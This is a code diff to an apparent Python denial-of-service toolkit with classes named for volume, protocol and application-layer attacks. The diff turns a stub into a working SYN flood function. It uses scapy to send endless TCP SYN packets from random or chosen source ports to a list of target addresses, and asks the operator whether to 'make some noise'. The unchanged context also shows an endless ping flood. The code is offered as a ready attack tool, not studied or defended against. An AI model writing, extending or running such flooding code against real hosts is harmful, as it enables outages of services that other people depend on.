@@ -4,6 +4,7 @@ import random
 import time
 import ping3
 import platform
+from scapy.all import IP, TCP, send, RandShort
 
 class VolumeBasedAttack:
     @staticmethod
@@ -133,9 +134,47 @@ class ProtocolAttack:
                     for i in vector:
                         ping3.verbose_ping(i, size=bye, count=0, interval=0)
 
+
+
     @staticmethod
-    def syn_flood(vector: list, bye: bytes, port: int):
-        print(f"syn_flood attack on {vector} with {len(bye)} bytes")
+    def syn_flood(vector: list, port: int):
+        portt = input("If you want to change the verbose mode or the starting port, type y... if you do not press (n) or other \n")
+        if portt == 'y':
+            sport = input("You can choose a different port where your TCP signal will start, do you want? (y/n) \n")
+            verbose = input("You can also choose if you want to make some noise while doing the attack, not advised, do you want? (y/n) \n")
+            
+            if sport.lower() == 'y' and verbose.lower() == 'y':
+                ssport = int(input("Choose the port: \n"))
+                for i in vector:
+                    ip = IP(dst=i)
+                    tcp = TCP(sport=ssport, dport=port, flags="S")
+                    pkt = ip/tcp
+                    send(pkt, loop=1, verbose=1)
+
+            elif sport.lower() != 'y' and verbose.lower() == 'y':
+                for i in vector:
+                    ip = IP(dst=i)
+                    tcp = TCP(sport=RandShort(), dport=port, flags="S")
+                    pkt = ip/tcp
+                    send(pkt, loop=1, verbose=1)
+
+            elif sport.lower() == 'y' and verbose.lower() != 'n':
+                ssport = int(input("Choose the port: \n"))
+                for i in vector:
+                    ip = IP(dst=i)
+                    tcp = TCP(sport=ssport, dport=port, flags="S")
+                    pkt = ip/tcp
+                    send(pkt, loop=1, verbose=1)
+
+            else:
+                pass
+        else:
+            for i in vector:
+                ip = IP(dst=i)
+                tcp = TCP(sport=RandShort(), dport=port, flags="S")
+                pkt = ip/tcp
+                send(pkt, loop=1, verbose=0)
+
 
 class ApplicationLayerAttack:
     @staticmethod
